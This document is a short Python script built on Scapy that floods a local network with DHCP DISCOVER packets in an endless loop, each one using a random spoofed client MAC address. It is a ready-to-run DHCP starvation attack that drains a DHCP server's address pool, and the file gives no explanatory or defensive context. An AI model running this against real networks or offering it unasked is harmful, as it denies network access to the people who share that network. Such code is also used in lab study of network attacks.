from scapy.all import *


def dhcp_discover(dst_mac="ff:ff:ff:ff:ff:ff"):
    src_mac = get_if_hwaddr(conf.iface)
    spoofed_mac = RandMAC()
    options = [("message-type", "discover"),
               ("max_dhcp_size", 1500),
               ("client_id", mac2str(spoofed_mac)),
               ("lease_time", 10000),
               ("end", "0")]
    transaction_id = random.randint(1, 900000000)
    dhcp_request = Ether(src=src_mac, dst=dst_mac)\
        / IP(src="0.0.0.0", dst="255.255.255.255")\
        / UDP(sport=68, dport=67)\
        / BOOTP(chaddr=[mac2str(spoofed_mac)],
                xid=transaction_id,
                flags=0xFFFFFF)\
        / DHCP(options=options)
    sendp(dhcp_request,
          iface=conf.iface)


if __name__ == "__main__":
    while(True):
        dhcp_discover()
